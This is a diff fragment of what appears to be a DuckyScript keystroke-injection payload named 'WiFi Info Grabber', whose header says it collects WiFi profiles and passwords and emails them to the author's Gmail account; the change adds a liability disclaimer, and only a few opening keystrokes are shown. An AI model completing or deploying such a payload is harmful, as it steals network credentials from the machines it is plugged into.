@@ -2,6 +2,7 @@ REM Title: WiFi Info Grabber
 REM Author: CoolJoe72
 REM Version: 1.5.1
 REM Description: Grabs WiFi profiles and passwords then emails it to your gmail account.
+REM Disclamer: The author will not be liable for any special, incidental, consequential or indirect damages due to loss of data or any other reason.
 DELAY 1000
 ESC
 GUI
